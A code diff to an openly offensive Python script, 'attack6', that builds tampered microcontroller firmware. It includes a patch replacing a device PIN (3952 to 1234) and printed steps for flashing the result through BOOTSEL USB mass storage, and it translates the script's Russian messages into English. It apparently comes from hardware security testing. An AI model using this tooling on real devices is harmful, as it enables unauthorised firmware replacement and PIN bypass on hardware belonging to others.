@@ -27,7 +27,7 @@ PATCHES = {
         0x5500,
         bytes([0x03, 0x09, 0x05, 0x02]),
         bytes([0x01, 0x02, 0x03, 0x04]),
-        "0x100054FF: PIN 3952 -> 1234",
+        "0x10005500: PIN 3952 -> 1234",
     )],
 }
 
@@ -89,21 +89,21 @@ def main(argv):
         return 1
     with open(argv[1], "rb") as f:
         original = f.read()
-    print(f"=== attack6: сборка злых прошивок из {argv[1]} ({len(original)} байт) ===")
-    print(f"образ-источник sha256[:16] = {sha(original)}")
+    print(f"=== attack6: build modified firmware from {argv[1]} ({len(original)} bytes) ===")
+    print(f"source image sha256[:16] = {sha(original)}")
 
     for name, patches in PATCHES.items():
-        print(f"\n--- вариант: {name} ---")
+        print(f"\n--- variant: {name} ---")
         try:
             image = patch_image(original, name)
         except ValueError as error:
             print(f"  {error}", file=sys.stderr)
             return 1
         for off, old, new, desc in patches:
-            print(f"  патч 0x{off:04x}: {old.hex(' ')} -> {new.hex(' ')}")
+            print(f"  patch 0x{off:04x}: {old.hex(' ')} -> {new.hex(' ')}")
 
         changed = [(i, original[i], image[i]) for i in range(len(original)) if original[i] != image[i]]
-        print(f"  изменённых байт: {len(changed)} -> " +
+        print(f"  changed bytes: {len(changed)} -> " +
               ", ".join(f"0x{i:04x}:{o:02x}->{n:02x}" for i, o, n in changed))
         verify_disasm(image, patches, name)
 
@@ -115,10 +115,10 @@ def main(argv):
                 return 1
             if not target.exists():
                 target.write_bytes(content)
-        print(f"  записано: {bin_name} ({len(image)} B, sha256[:16]={sha(image)}), "
-              f"{uf2_name} (BOOTSEL drag-and-drop)")
-    print("\nготово. Доставка: удержать BOOTSEL на целевой плате, подключить USB, "
-          "скопировать .uf2 — прошивка подменится без единого паяльного движения")
+        print(f"  written: {bin_name.name} ({len(image)} B, sha256[:16]={sha(image)}), "
+              f"{uf2_name.name} (BOOTSEL drag-and-drop)")
+    print("\nDone. For delivery, hold BOOTSEL on the target board, connect USB, "
+          "and copy the .uf2 file to replace the firmware")
     return 0
 
 
